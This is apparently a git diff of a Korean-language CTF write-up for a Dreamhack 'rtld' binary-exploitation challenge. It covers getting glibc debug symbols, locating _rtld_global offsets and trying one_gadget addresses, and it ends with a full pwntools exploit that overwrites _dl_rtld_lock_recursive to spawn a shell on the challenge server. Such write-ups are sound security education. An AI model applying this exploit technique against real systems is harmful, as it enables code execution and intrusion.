@@ -166,7 +166,7 @@ p.interactive()
 
 .
 
-분명 틀린거 없이 했는데 정답이 안나와서 제대로 된 환경 맞춰서 다시 해보겠다.
+분명 방법이 맞는거 같은데 정답이 안나와서 제대로 된 환경 맞춰서 다시 검증 해보겠다.
 
 ### 다시 시도  
 
@@ -198,8 +198,104 @@ p.interactive()
 https://launchpad.net/ubuntu/+source/glibc/2.23-0ubuntu11.3  
 
 여기서 다운 받아야하는 거 찾아주고 아래 링크에 파일을 다운 받았다.   
+<br>
+
+다운 링크를 찾느라 고생을 좀 했는데   
+
+- https://launchpad.net/ubuntu/xenial/amd64/libc6-dbg/2.23-0ubuntu11.3
+
+여긴 다운로드 파일이 있는 링크이다  
+여기서 다운 링크를 복붙하고 wget 해주면 된다.  
+
+파일 다운링크 : `http://launchpadlibrarian.net/534747094/libc6-dbg_2.23-0ubuntu11.3_amd64.deb`  
 
 ```bash
-wget http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.23-0ubuntu11.3_amd64.deb
-
+wget http://launchpadlibrarian.net/534747094/libc6-dbg_2.23-0ubuntu11.3_amd64.deb
+dpkg -x libc6-dbg_2.23-0ubuntu11.3_amd64.deb ./
 ```
+
+<br>
+
+
+
+
+
+<img width="1445" height="918" alt="image" src="https://github.com/user-attachments/assets/7caf11df-07fe-4ad9-862b-39606d1e9d6c" />
+
+파일이 있는 걸 확인할 수 있다.   
+
+`libc6-dbg` 같이 디버깅 파일이 아니면 구조체 변수를 따로 명령어로 찾질 못한다.  
+
+그래서 명령어를 아무리 써도 오프셋을 알아낼 수 없었고 `p &_rtld_global` 로 rtld 주소를 알아낸 뒤 들어있는 값을 쭉 뽑아봐도 대부분 0x00 만 들어있어서 오프셋 가늠이 안됐다.  
+
+<br>
+
+
+<img width="1300" height="253" alt="image" src="https://github.com/user-attachments/assets/d529909c-5281-4f67-922a-82162aa8599c" />
+
+아무튼 이렇게 오프셋을 알아냈다.  
+
+이전에는 `dl_load_lock` 주소를 2264 로 했는데 2312 였다.  
+그래도 이건 문제 푸는데 지장이 없었을거라 상관은 없을텐데 그럼 문제가 뭔지 정확히 나왔다.   
+
+아무래도 리턴 주소를 이상하게 조작한듯하다.   
+
+이부분은 그럼 원가젯으로 대체하자.  
+
+libc 베이스 주소도 나왔겠다 바로 원가젯을 찾아준다.  
+
+<br>
+
+
+<img width="1748" height="454" alt="image" src="https://github.com/user-attachments/assets/71b096e2-ec50-4a98-991e-ee3b28774c3b" />
+
+이렇게 세개가 나왔고 각각 실행시켜보자.  
+
+<br>
+
+**최종 익스플로잇 코드**  
+
+```python
+from pwn import *
+
+#p = process('./rtld')
+p = remote('host8.dreamhack.games', 23034)
+
+e = ELF('./rtld')
+libc = ELF('./libc-2.23.so')
+ld = ELF('./ld-2.23.so')
+
+p.recvuntil(b': ')
+
+stdout = int(p.recvuntil(b'\n'), 16)
+libc_base = stdout - libc.symbols['_IO_2_1_stdout_']
+ld_base = libc_base + 0x3ca000
+
+print('libc_base..', hex(libc_base))
+print('ld_base..', hex(ld_base))
+
+rtld_global = ld_base + ld.symbols['_rtld_global']
+dl_load_lock = rtld_global + 2312
+dl_rtld_lock_recursive = rtld_global + 3848
+
+print('rtld_global..', hex(rtld_global))
+print('dl_load_lock..', hex(dl_load_lock))
+print('dl_rtld_lock_recursive..', hex(dl_rtld_lock_recursive))
+
+one_gadget = libc_base + 0x4527a
+#one_gadget = libc_base + 0xf03a4 < Failed address
+#one_gadget = libc_base + 0x45226 < Failed address
+
+p.sendlineafter(b'addr: ', str(dl_rtld_lock_recursive).encode())
+p.sendlineafter(b'value: ', str(one_gadget).encode())
+
+p.interactive()
+```
+
+`one_gadget = libc_base + 0x4527a` 일 때만 실행이 된다.  
+
+<br>
+
+<img width="1621" height="1119" alt="image" src="https://github.com/user-attachments/assets/4d543ddd-104d-4906-a81a-619f9bcf65b2" />
+
+성공 gg
